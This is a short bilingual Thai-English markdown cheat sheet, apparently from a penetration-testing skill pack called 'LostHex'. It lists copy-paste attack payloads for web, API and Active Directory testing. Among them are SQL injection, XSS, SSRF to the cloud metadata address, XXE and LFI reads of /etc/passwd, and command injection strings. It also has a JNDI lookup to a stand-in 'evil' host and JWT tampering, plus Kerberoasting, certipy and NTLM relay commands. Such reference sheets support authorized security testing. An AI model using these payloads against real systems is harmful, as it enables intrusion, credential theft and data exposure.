# ⚡ Payload Index — ค้นเร็ว / Quick Lookup

> รายละเอียดเต็ม + verify อยู่ในแต่ละ skill — นี่คือ index ให้ก็อปไปลองเร็ว  
> Full details + verify steps are in each skill — this is the copy-paste quick index.

## 🌐 WEB

| Vuln | Payload ย่อ / Minimal | ดูเพิ่ม / See |
|---|---|---|
| **SQLi** | `' OR 1=1-- -` · `1' UNION SELECT null,@@version-- -` · `' OR SLEEP(5)-- -` | `losthex-web` |
| **XSS** | `<svg onload=alert(1)>` · `"><img src=x onerror=alert(1)>` | `losthex-web` |
| **SSTI** | `{{7*7}}` · `${7*7}` · `<%=7*7%>` → ถ้าตอบ `49` คือติด | `losthex-web` |
| **SSRF** | `http://127.0.0.1:80` · `http://169.254.169.254/latest/meta-data/` | `losthex-web` |
| **XXE** | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | `losthex-web` |
| **LFI** | `../../../../etc/passwd` · `php://filter/convert.base64-encode/resource=index` | `losthex-web` |
| **Upload** | `.phtml` · `%.php` · `Content-Type: image/png` + `\x89PNG` | `losthex-web` |
| **CMDi** | `; id` · `| id` · `&& id` · `$(id)` | `losthex-web` |
| **EL / JNDI** | `${7*7}` · `${jndi:ldap://evil/a}` | `losthex-web` |

## 🔌 API

| Vuln | Payload ย่อ | ดูเพิ่ม |
|---|---|---|
| **BOLA** | เปลี่ยน `id` เป็นของคนอื่น — ถ้าได้ 200 + data คนอื่นคือติด | `losthex-api` |
| **Mass assign** | เติม `{"role":"admin"}` ใน POST/PUT | `losthex-api` |
| **JWT** | `{"alg":"none"}` · `kid` traversal · `jku` → evil host | `losthex-api` |
| **GraphQL** | `{"query":"{__schema{types{name}}}"}` | `losthex-api` |

## 🏢 AD

| Vuln | คำสั่งย่อ | ดูเพิ่ม |
|---|---|---|
| **Kerberoast** | `GetUserSPNs.py domain/user:pass -dc-ip IP -request` | `losthex-ad` |
| **ADCS ESC1-8** | `certipy find -u user@domain -p pass -dc-ip IP -vuln` | `losthex-ad` |
| **NTLM relay** | `ntlmrelayx.py -tf targets.txt --escalate-user attacker` | `losthex-ad` |

> 🔍 **Verify ทุกครั้ง:** ต้องมี `request.txt` + `response.txt` + proof (dnslog / file read / token reuse) ใน `evidence/` ก่อนนับเป็น finding

## 📚 หาเพิ่ม

- WSTG test → `references/wstg-index.md` หรือ `/LostHex-METHOD WSTG-XXX`
- MITRE technique → `references/mitre-index.md` หรือ `/LostHex-METHOD T####`
- Playbook → `references/playbooks.md`
